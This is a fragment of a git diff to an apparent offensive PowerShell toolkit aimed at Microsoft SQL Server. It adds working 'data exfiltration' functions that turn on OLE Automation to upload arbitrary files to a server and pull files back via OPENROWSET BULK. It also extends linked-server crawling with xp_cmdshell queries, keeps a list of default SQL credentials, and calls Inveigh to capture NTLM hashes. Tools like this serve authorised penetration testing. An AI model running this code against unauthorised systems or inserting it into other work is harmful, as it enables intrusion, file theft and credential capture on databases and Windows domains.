+            $FullDN = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=group)(samaccountname=$FilterGroup))" -LdapFields 'distinguishedname' -UseAdHoc -SuppressVerbose
         }else{
-            $FullDN = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=group)(samaccountname=$FilterGroup))" -LdapFields 'distinguishedname' -SuppressVerbose       
+            $FullDN = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=group)(samaccountname=$FilterGroup))" -LdapFields 'distinguishedname' -SuppressVerbose       
         }
 
         $DN = $FullDN.distinguishedname
 
         # Call Get-SQLDomainObject to get group membership
         if($UseAdHoc){
-            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=user)(memberOf=$DN))" -LdapFields 'samaccountname,displayname' -UseAdHoc
+            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=user)(memberOf=$DN))" -LdapFields 'samaccountname,displayname' -UseAdHoc
         }else{
-            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=user)(memberOf=$DN))" -LdapFields 'samaccountname,displayname'     
+            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=user)(memberOf=$DN))" -LdapFields 'samaccountname,displayname'     
         }
 
         $Results | ForEach-Object {           
@@ -14966,9 +15106,9 @@ Function  Get-SQLServerLoginDefaultPw
         $DefaultPasswords.Rows.Add("SIDEXIS_SQL","sa","2BeChanged") | Out-Null
         $DefaultPasswords.Rows.Add("SQL2K5","ovsd","ovsd") | Out-Null
         $DefaultPasswords.Rows.Add("SQLEXPRESS","admin","ca_admin") | out-null
-        $DefaultPasswords.Rows.Add("SQLEXPRESS","gcs_client","SysGal.5560") | Out-Null     #SA password = GCSsa5560 
-        $DefaultPasswords.Rows.Add("SQLEXPRESS","gcs_web_client","SysGal.5560") | out-null #SA password = GCSsa5560 
-        $DefaultPasswords.Rows.Add("SQLEXPRESS","NBNUser","NBNPassword") | out-null
+        #$DefaultPasswords.Rows.Add("SQLEXPRESS","gcs_client","SysGal.5560") | Out-Null     #SA password = GCSsa5560 
+        #$DefaultPasswords.Rows.Add("SQLEXPRESS","gcs_web_client","SysGal.5560") | out-null #SA password = GCSsa5560 
+        #$DefaultPasswords.Rows.Add("SQLEXPRESS","NBNUser","NBNPassword") | out-null
         $DefaultPasswords.Rows.Add("STANDARDDEV2014","test","test") | Out-Null 
         $DefaultPasswords.Rows.Add("TEW_SQLEXPRESS","tew","tew") | Out-Null
         $DefaultPasswords.Rows.Add("vocollect","vocollect","vocollect") | Out-Null
@@ -15079,7 +15219,9 @@ Function Get-SQLServerLinkCrawl{
     .PARAMETER TimeOut
     Connection timeout.
     .PARAMETER Query
-    Custom SQL query to run on each server.
+    Custom SQL query to run. If QueryTarget isn's given, this will run on each server.
+    PARAMETER QueryTarget
+    Link to run SQL query on.
     .PARAMETER Export
     Convert collected data to exportable format.
     .Example
@@ -15132,8 +15274,12 @@ Function Get-SQLServerLinkCrawl{
         [int]$TimeOut = 2,
 
         [Parameter(Mandatory=$false,
-        HelpMessage="Custom SQL query to run on each server.")]
+        HelpMessage="Custom SQL query to run. If QueryTarget isn's given, this will run on each server.")]
         [string]$Query,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Link to run SQL query on.")]
+        [string]$QueryTarget,
 
         [Parameter(Mandatory=$false,
         HelpMessage="Convert collected data to exportable format.")]
@@ -15157,7 +15303,7 @@ Function Get-SQLServerLinkCrawl{
             $i--
             foreach($Server in $List){
                 if($Server.Instance -eq "") {
-                    $List = (Get-SQLServerLinkData -list $List -server $Server -query $Query)
+                    $List = (Get-SQLServerLinkData -list $List -server $Server -query $Query -QueryTarget $QueryTarget)
                     $i++
 
                     # Verbose output
@@ -15211,7 +15357,11 @@ Function Get-SQLServerLinkData{
 
         [Parameter(Mandatory=$false,
         HelpMessage="Custom SQL query to run")]
-        $Query
+        $Query,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Target of custom SQL query to run")]
+        $QueryTarget
     )
 
     Begin
@@ -15235,17 +15385,19 @@ Function Get-SQLServerLinkData{
             $Server.Links = [array]$SqlInfoTable.srvname
 
             if($Query -ne ""){
-                if($Query -like '*xp_cmdshell*'){
-                    $Query =  $Query + " WITH RESULT SETS ((output VARCHAR(8000)))"
-                }
-                if($Query -like '*xp_dirtree*'){
-                    $Query = $Query + "  WITH RESULT SETS ((output VARCHAR(8000), depth int))"
-                }
-                $SqlInfoTable = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $Query)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
-                if($Query -like '*WITH RESULT SETS*'){
-                    $Server.CustomQuery = $SqlInfoTable.output
-                } else {
-                    $Server.CustomQuery = $SqlInfoTable
+                if($QueryTarget -eq "" -or ($QueryTarget -ne "" -and $Server.Instance -eq $QueryTarget)){
+                    if($Query -like '*xp_cmdshell*'){
+                        $Query =  $Query + " WITH RESULT SETS ((output VARCHAR(8000)))"
+                    }
+                    if($Query -like '*xp_dirtree*'){
+                        $Query = $Query + "  WITH RESULT SETS ((output VARCHAR(8000), depth int))"
+                    }
+                    $SqlInfoTable = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $Query)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
+                    if($Query -like '*WITH RESULT SETS*'){
+                        $Server.CustomQuery = $SqlInfoTable.output
+                    } else {
+                        $Server.CustomQuery = $SqlInfoTable
+                    }
                 }
             }
 
@@ -15286,6 +15438,49 @@ Function Get-SQLServerLinkQuery{
     }
 }
 
+
+# ----------------------------------
+#  Test-FolderWriteAccess
+# ----------------------------------
+# Author: Scott Sutherland
+Function Test-FolderWriteAccess
+{
+    <#
+            .SYNOPSIS
+            Check if the current user has write access to a provided directory by creating a temp file and removing it.
+            .PARAMETER OutFolder
+            Output directory path.
+            .EXAMPLE
+            PS C:\> Test-FolderWriteAccess "c:\windows\system32"
+            False 
+            .EXAMPLE
+            PS C:\> Test-FolderWriteAccess "$env:LOCALAPPDATA"
+            True
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+        ValueFromPipeline = $true,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Folder you would like to test write access to.')]
+        [string]$OutFolder
+    )
+
+    Process
+    {
+        # Create randomized 15 character file name
+        $WriteTestFile = (-join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_}))
+
+        # Test Write Access
+        Try { 
+            write-output "test" | Out-File "$OutFolder\$WriteTestFile"
+            rm "$OutFolder\$WriteTestFile"
+            return $true
+        }Catch{  
+            return $false
+        }
+    }
+}
 #endregion
 
 #########################################################################
@@ -15519,8 +15714,12 @@ function Get-DomainObject
             .EXAMPLE
             PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))"
             .EXAMPLE
+            PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))" -DomainController 10.0.0.1:389
+            It will use the security context of the current process to authenticate to the domain controller.
+            IP:Port can be specified to reach a pivot machine.
+            .EXAMPLE
             PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))" -DomainController 10.0.0.1  -Username Domain\User  -Password Password123!
-            .Note
+            .Notes
             This was based on Will Schroeder's Get-ADObject function from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
     #>
     [CmdletBinding()]
@@ -15572,31 +15771,35 @@ function Get-DomainObject
         if ($DomainController)
         {
            
-            # Verify credentials were provided
-            if(-not $Username){
-                Write-Output "A username and password must be provided when setting a specific domain controller."
-                Break
-            }
-
             # Test credentials and grab domain
             try {
-                $objDomain = (New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "LDAP://$DomainController", $Credential.UserName, $Credential.GetNetworkCredential().Password).distinguishedname
+
+                $ArgumentList = New-Object Collections.Generic.List[string]
+                $ArgumentList.Add("LDAP://$DomainController")
+
+                if($Username){
+                    $ArgumentList.Add($Credential.UserName)
+                    $ArgumentList.Add($Credential.GetNetworkCredential().Password)
+                }
+
+                $objDomain = (New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList $ArgumentList).distinguishedname
+
+                # Authentication failed. distinguishedName property can not be empty.
+                if(-not $objDomain){ throw }
+
             }catch{
-                Write-Output "Authentication failed."
+                Write-Output "Authentication failed or domain controller is not reachable."
+                Break
             }
 
             # add ldap path
             if($LdapPath)
             {
                 $LdapPath = '/'+$LdapPath+','+$objDomain
-                $objDomainPath = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "LDAP://$DomainController$LdapPath", $Credential.UserName, $Credential.GetNetworkCredential().Password
-            }
-            else
-            {
-                $objDomainPath = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "LDAP://$DomainController", $Credential.UserName, $Credential.GetNetworkCredential().Password
+                $ArgumentList[0] = "LDAP://$DomainController$LdapPath"
             }
 
-            $objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList $objDomainPath
+            $objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList $ArgumentList
         }
         else
         {
@@ -17344,7 +17547,591 @@ Function  Get-SQLServerPasswordHash
 #region          DATA EXFILTRATION FUNCTIONS
 #
 #########################################################################
-#
+
+# ----------------------------------
+#  Invoke-SQLUploadFileOle
+# ----------------------------------
+# Author: Mariusz B. / mgeeky
+# Reference: https://www.blackarrow.net/mssqlproxy-pivoting-clr/
+# Reference: https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/ole-automation-stored-procedures-transact-sql?view=sql-server-ver15
+Function  Invoke-SQLUploadFileOle
+{
+    <#
+            .SYNOPSIS
+            Uploads given file to the operating system as the SQL Server service account using OLE automation procedures.
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Credential
+            SQL Server credential.
+            .PARAMETER Instance
+            SQL Server instance to connection to.
+            .PARAMETER DAC
+            Connect using Dedicated Admin Connection.
+            .PARAMETER TimeOut
+            Connection time out.
+            .PARAMETER SuppressVerbose
+            Suppress verbose errors.  Used when function is wrapped.
+            .PARAMETER Threads
+            Number of concurrent threads.
+            .PARAMETER InputFile
+            Input file to be uploaded to the SQL Server's filesystem.
+            .PARAMETER OutputFile
+            Destination file path in the target SQL Server's filesystem.
+            .EXAMPLE
+            PS C:\> Invoke-SQLUploadFileOle -Verbose -Instance DEVSRV -InputFile "C:\Windows\win.ini" -OutputFile "C:\Users\Public\win.ini"
+            VERBOSE: DEVSRV : Connection Success.
+            VERBOSE: DEVSRV : You are a sysadmin.
+            VERBOSE: DEVSRV : Show Advanced Options is already enabled.
+            VERBOSE: DEVSRV : Ole Automation Procedures are already enabled.
+            VERBOSE: DEVSRV : Reading input file: C:\windows\win.ini
+            VERBOSE: DEVSRV : Uploading 92 bytes to: C:\Users\Public\win.ini
+            VERBOSE: DEVSRV : Connection Success.
+            VERBOSE: DEVSRV : Success. File uploaded.
+            VERBOSE: Closing the runspace pool
+
+            ComputerName Instance UploadResults
+            ------------ -------- -------------
+            DEVSRV       DEVSRV   True 
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Windows credentials.')]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Connect using Dedicated Admin Connection.')]
+        [Switch]$DAC,
+
+        [Parameter(Mandatory = $true,
+        HelpMessage = 'Input local file to be uploaded to target server.')]
+        [ValidateScript({
+                    Test-Path $_ -PathType leaf
+        })]
+        [String]$InputFile = "",
+
+        [Parameter(Mandatory = $true,
+        HelpMessage = 'Destination file path where the file should be uploaded on the remote server.')]
+        [String]$OutputFile = "",
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Connection timeout.')]
+        [string]$TimeOut,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Number of threads.')]
+        [int]$Threads = 1,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+        # Setup data table for output
+        $TblCommands = New-Object -TypeName System.Data.DataTable
+        $TblResults = New-Object -TypeName System.Data.DataTable
+        $null = $TblResults.Columns.Add('ComputerName')
+        $null = $TblResults.Columns.Add('Instance')
+        $null = $TblResults.Columns.Add('UploadResults')
+
+
+        # Setup data table for pipeline threading
+        $PipelineItems = New-Object -TypeName System.Data.DataTable
+
+        # Set instance to local host by default
+        if(-not $Instance)
+        {
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Ensure provided instance is processed
+        if($Instance)
+        {
+            $ProvideInstance = New-Object -TypeName PSObject -Property @{
+                Instance = $Instance
+            }
+        }
+
+        # Add instance to instance list
+        $PipelineItems = $PipelineItems + $ProvideInstance
+    }
+
+    Process
+    {
+        # Create list of pipeline items
+        $PipelineItems = $PipelineItems + $_
+    }
+
+    End
+    {
+        # Define code to be multi-threaded
+        $MyScriptBlock = {
+            $Instance = $_.Instance
+
+            # Parse computer name from the instance
+            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+
+            # Default connection to local default instance
+            if(-not $Instance)
+            {
+                $Instance = $env:COMPUTERNAME
+            }
+
+            # Setup DAC string
+            if($DAC)
+            {
+                # Create connection object
+                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
+            }
+            else
+            {
+                # Create connection object
+                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
+            }
+
+            # Attempt connection
+            try
+            {
+                # Open connection
+                $Connection.Open()
+
+                if(-not $SuppressVerbose)
+                {
+                    Write-Verbose -Message "$Instance : Connection Success."
+                }
+
+                # Switch to track Ole Automation Procedures status
+                $DisableShowAdvancedOptions = 0
+                $DisableOle = 0
+
+                # Get sysadmin status
+                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
+
+                # Check if OLE Automation Procedures are enabled
+                if($IsSysadmin -eq 'Yes')
+                {
+                    Write-Verbose -Message "$Instance : You are a sysadmin."
+                    $IsOleEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Ole Automation Procedures'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
+                    $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
+                }
+                else
+                {
+                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."
+
+                    # Add record
+                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",'No sysadmin privileges.')
+                    return
+                }
+
+                # Enable show advanced options if needed
+                if ($IsShowAdvancedEnabled -eq 1)
+                {
+                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
+                }
+                else
+                {
+                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
+                    $DisableShowAdvancedOptions = 1
+
+                    # Try to enable Show Advanced Options
+                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+
+                    # Check if configuration change worked
+                    $IsShowAdvancedEnabled2 = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
+
+                    if ($IsShowAdvancedEnabled2 -eq 1)
+                    {
+                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
+                    }
+                    else
+                    {
+                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."
+
+                        # Add record
+                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Could not enable Show Advanced Options.')
+                        return
+                    }
+                }
+
+                # Enable OLE Automation Procedures if needed
+                if ($IsOleEnabled -eq 1)
+                {
+                    Write-Verbose -Message "$Instance : Ole Automation Procedures are already enabled."
+                }
+                else
+                {
+                    Write-Verbose -Message "$Instance : Ole Automation Procedures are disabled."
+                    $DisableOle = 1
+
+                    # Try to enable Ole Automation Procedures
+                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Ole Automation Procedures',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+
+                    # Check if configuration change worked
+                    $IsOleEnabled2 = Get-SQLQuery -Instance $Instance -Query 'sp_configure "Ole Automation Procedures"' -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
+
+                    if ($IsOleEnabled2 -eq 1)
+                    {
+                        Write-Verbose -Message "$Instance : Enabled Ole Automation Procedures."
+                    }
+                    else
+                    {
+                        Write-Verbose -Message "$Instance : Enabling Ole Automation Procedures failed. Aborting."
+
+                        # Add record
+                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Could not enable Ole Automation Procedures.')
+
+                        return
+                    }
+                }
+
+                $InputFileFull = (Get-Item $InputFile).FullName
+                write-verbose "$instance : Reading input file: $InputFileFull"
+                try
+                {
+                    $FileBytes = [System.IO.File]::ReadAllBytes($InputFileFull)
+                    $FileDataTmp = New-Object System.Collections.Generic.List[System.Object]
+                    foreach ($b in $FileBytes)
+                    { 
+                        $FileDataTmp.Add($b.ToString("X2"))
+                    }
+
+                    $FileData = [system.String]::Join('', $FileDataTmp.ToArray())
+                }
+                catch
+                {
+                    if(-not $SuppressVerbose)
+                    {
+                        $ErrorMessage = $_.Exception.Message
+                        Write-Verbose "Could not read input file: $ErrorMessage"
+                    }
+
+                    # Add record
+                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Input file could not be read.')
+                }
+
+                #  Setup query to run command
+                write-verbose "$instance : Uploading $($FileBytes.Length) bytes to: $OutputFile"           
+                $QueryFileUpload = 
+@"
+DECLARE @ob INT;
+EXEC sp_OACreate 'ADODB.Stream', @ob OUTPUT;
+EXEC sp_OASetProperty @ob, 'Type', 1;
+EXEC sp_OAMethod @ob, 'Open';
+EXEC sp_OAMethod @ob, 'Write', NULL, 0x$FileData;
+EXEC sp_OAMethod @ob, 'SaveToFile', NULL, '$OutputFile', 2;
+EXEC sp_OAMethod @ob, 'Close';
+EXEC sp_OADestroy @ob;
+"@
+
+                # Execute query    
+                $null = Get-SQLQuery -Instance $Instance -Query $QueryFileUpload -Username $Username -Password $Password -Credential $Credential -SuppressVerbose 
+
+                # Setup query for reading command output
+                $QueryCheckFileExists = "EXEC master..xp_fileexist '$OutputFile' WITH RESULT SETS ((fileexists bit, fileisdirectory bit, parentdirectoryexists bit))"
+
+                # Execute query
+                $CmdResults = Get-SQLQuery -Instance $Instance -Query $QueryCheckFileExists -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property fileexists -ExpandProperty fileexists
+
+                if ($CmdResults -eq $True)
+                {
+                    Write-Verbose -Message "$Instance : Success. File uploaded."
+                }
+                else
+                {
+                    Write-Verbose -Message "$Instance : Failure. File NOT uploaded."
+                }
+
+                # Display results or add to final results table
+                $null = $TblResults.Rows.Add($ComputerName, $Instance, [string]$CmdResults)
+
+                # Restore 'Ole Automation Procedures state if needed
+                if($DisableOle -eq 1)
+                {
+                    Write-Verbose -Message "$Instance : Disabling 'Ole Automation Procedures"
+                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Ole Automation Procedures',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+                }
+
+                # Restore Show Advanced Options state if needed
+                if($DisableShowAdvancedOptions -eq 1)
+                {
+                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
+                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+                }
+
+                # Close connection
+                $Connection.Close()
+
+                # Dispose connection
+                $Connection.Dispose()
+            }
+            catch
+            {
+                # Connection failed
+
+                if(-not $SuppressVerbose)
+                {
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose -Message "$Instance : Connection Failed."
+                    #Write-Verbose  " Error: $ErrorMessage"
+                }
+
+                # Add record
+                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible or Command Failed')
+            }
+        }
+
+        # Run scriptblock using multi-threading
+        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
+
+        return $TblResults
+    }
+}
+
+
+# ----------------------------------
+#  Invoke-SQLDownloadFile
+# ----------------------------------
+# Author: Mariusz B. / mgeeky
+# Reference: https://www.blackarrow.net/mssqlproxy-pivoting-clr/
+# Reference: https://docs.microsoft.com/en-us/sql/relational-databases/import-export/import-bulk-data-by-using-bulk-insert-or-openrowset-bulk-sql-server?view=sql-server-ver15
+Function  Invoke-SQLDownloadFile
+{
+    <#
+            .SYNOPSIS
+            Uploads given file to the operating system as the SQL Server service account using OPENROWSET BULK Query.
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Credential
+            SQL Server credential.
+            .PARAMETER Instance
+            SQL Server instance to connection to.
+            .PARAMETER DAC
+            Connect using Dedicated Admin Connection.
+            .PARAMETER TimeOut
+            Connection time out.
+            .PARAMETER SuppressVerbose
+            Suppress verbose errors.  Used when function is wrapped.
+            .PARAMETER Threads
+            Number of concurrent threads.
+            .PARAMETER SourceFile
+            Source file to download from target SQL Server's filesystem.
+            .PARAMETER OutputFile
+            Where to save downloaded file locally on the user's filesystem.
+            .EXAMPLE
+            PS C:\> Invoke-SQLDownloadFile -Verbose -Instance DEVSRV -SourceFile "C:\Windows\win.ini" -OutputFile "C:\Users\Public\win.ini"
+            VERBOSE: Creating runspace pool and session states
+            VERBOSE: DEVSRV : Connection Success.
+            VERBOSE: DEVSRV : File exists. Attempting to download: C:\Windows\win.ini
+            VERBOSE: DEVSRV : Downloaded. Writing 92 to C:\Users\Public\win.ini...
+            VERBOSE: Closing the runspace pool
+
+            ComputerName Instance DownloadResults
+            ------------ -------- ---------------
+            DEVSRV       DEVSRV   True  
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Windows credentials.')]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Connect using Dedicated Admin Connection.')]
+        [Switch]$DAC,
+
+        [Parameter(Mandatory = $true,
+        HelpMessage = 'Source file to download from target SQL Server filesystem.')]
+        [String]$SourceFile = "",
+
+        [Parameter(Mandatory = $true,
+        HelpMessage = 'Where to save downloaded file locally on the user filesystem.')]
+        [String]$OutputFile = "",
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Connection timeout.')]
+        [string]$TimeOut,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Number of threads.')]
+        [int]$Threads = 1,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+        # Setup data table for output
+        $TblCommands = New-Object -TypeName System.Data.DataTable
+        $TblResults = New-Object -TypeName System.Data.DataTable
+        $null = $TblResults.Columns.Add('ComputerName')
+        $null = $TblResults.Columns.Add('Instance')
+        $null = $TblResults.Columns.Add('DownloadResults')
+
+
+        # Setup data table for pipeline threading
+        $PipelineItems = New-Object -TypeName System.Data.DataTable
+
+        # set instance to local host by default
+        if(-not $Instance)
+        {
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Ensure provided instance is processed
+        if($Instance)
+        {
+            $ProvideInstance = New-Object -TypeName PSObject -Property @{
+                Instance = $Instance
+            }
+        }
+
+        # Add instance to instance list
+        $PipelineItems = $PipelineItems + $ProvideInstance
+    }
+
+    Process
+    {
+        # Create list of pipeline items
+        $PipelineItems = $PipelineItems + $_
+    }
+
+    End
+    {
+        # Define code to be multi-threaded
+        $MyScriptBlock = {
+            $Instance = $_.Instance
+
+            # Parse computer name from the instance
+            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+
+            # Default connection to local default instance
+            if(-not $Instance)
+            {
+                $Instance = $env:COMPUTERNAME
+            }
+
+            # Setup DAC string
+            if($DAC)
+            {
+                # Create connection object
+                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
+            }
+            else
+            {
+                # Create connection object
+                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
+            }
+
+            # Attempt connection
+            try
+            {
+                # Open connection
+                $Connection.Open()
+
+                if(-not $SuppressVerbose)
+                {
+                    Write-Verbose -Message "$Instance : Connection Success."
+                }
+
+                # Setup query for reading command output
+                $QueryCheckFileExists = "EXEC master..xp_fileexist '$SourceFile' WITH RESULT SETS ((fileexists bit, fileisdirectory bit, parentdirectoryexists bit))"
+
+                # Execute query
+                $CmdResults = Get-SQLQuery -Instance $Instance -Query $QueryCheckFileExists -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property fileexists -ExpandProperty fileexists
+
+                if ($CmdResults -eq $True)
+                {
+                    Write-Verbose -Message "$Instance : File exists. Attempting to download: $SourceFile"
+
+                    $QueryFileDownload = "SELECT * FROM OPENROWSET(BULK N'$SourceFile', SINGLE_BLOB) rs"
+
+                    # Execute query    
+                    $FileBytes = Get-SQLQuery -Instance $Instance -Query $QueryFileDownload -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property BulkColumn -ExpandProperty BulkColumn
+
+                    $FileBytesArr = $FileBytes -split ' '
+
+                    Write-Verbose "$Instance : Downloaded. Writing $($FileBytesArr.Length) to $OutputFile..."
+
+                    $FileContents = ($FileBytesArr | % {[byte][convert]::ToInt32($_)})
+
+                    [IO.File]::WriteAllBytes($OutputFile, $FileContents)
+
+                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",$True)
+                }
+                else
+                {
+                    Write-Verbose -Message "$Instance : Failure. Specified file does not exist."
+
+                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Source file does not exist')
+                }
+
+                # Close connection
+                $Connection.Close()
+
+                # Dispose connection
+                $Connection.Dispose()
+            }
+            catch
+            {
+                # Connection failed
+
+                if(-not $SuppressVerbose)
+                {
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose -Message "$Instance : Connection Failed."
+                    Write-Verbose  " Error: $ErrorMessage"
+                }
+
+                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible or Command Failed')
+            }
+        }
+
+        # Run scriptblock using multi-threading
+        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
+
+        return $TblResults
+    }
+}
+
+
 #endregion
 
 #########################################################################
@@ -19934,21 +20721,21 @@ Function Invoke-SQLAuditPrivXpDirtree
                                 $HashType = ''
                                 $Hash = ''
 
-                                [string]$PassCleartext = Get-Inveigh -Cleartext Y
+                                [string]$PassCleartext = Get-Inveigh -Cleartext
                                 if($PassCleartext)
                                 {
                                     $HashType = 'Cleartext'
                                     $Hash = $PassCleartext
                                 }
 
-                                [string]$PassNetNTLMv1 = Get-Inveigh -NTLMv1 Y
+                                [string]$PassNetNTLMv1 = Get-Inveigh -NTLMv1
                                 if($PassNetNTLMv1)
                                 {
                                     $HashType = 'NetNTLMv1'
